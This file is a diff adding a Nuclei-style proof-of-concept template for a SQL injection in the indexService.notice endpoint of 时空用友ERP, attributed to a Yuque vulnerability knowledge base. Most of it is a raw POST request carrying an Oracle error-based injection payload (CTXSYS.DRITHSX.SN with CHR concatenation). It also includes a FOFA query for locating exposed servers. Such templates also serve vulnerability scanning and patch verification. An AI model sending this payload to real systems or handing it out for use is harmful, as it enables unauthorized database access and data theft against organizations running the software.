@@ -1,0 +1,32 @@
+id: poc-acll46zdvfffaczu
+info:
+  name: 时空用友ERP indexService.notice存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/acll46zdvfffaczu'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: acll46zdvfffaczu
+    fofa: body="login.jsp?login=null"
+http:
+- raw:
+  - 'POST /formservice?service=indexService.notice HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Connection: close
+
+    Content-Type: application/json
+
+
+    {"id":"1'' AND 6448=CTXSYS.DRITHSX.SN(6448,(CHR(113)||CHR(122)||CHR(112)||CHR(118)||CHR(113)||(SELECT (CASE WHEN (6448=6448) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(122)||CHR(118)||CHR(118)||CHR(113)))-- fKEk"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
